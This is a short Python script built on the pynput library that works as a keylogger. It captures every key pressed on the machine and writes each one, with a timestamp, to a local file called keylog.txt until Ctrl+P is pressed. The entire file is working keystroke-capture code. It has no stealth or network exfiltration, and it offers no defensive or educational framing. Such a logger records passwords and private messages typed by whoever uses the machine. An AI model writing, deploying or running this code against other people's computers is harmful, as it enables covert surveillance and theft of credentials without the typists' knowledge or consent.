from pynput import keyboard
import logging

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Variable to track if Ctrl is pressed
ctrl_pressed = False

def on_press(key):
    global ctrl_pressed

    try:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            ctrl_pressed = True
        elif key == keyboard.KeyCode.from_char('p') and ctrl_pressed:
            logging.info('Ctrl + P pressed. Exiting.')
            return False  # Stop listener
        else:
            logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    global ctrl_pressed

    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        ctrl_pressed = False

# Set up listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
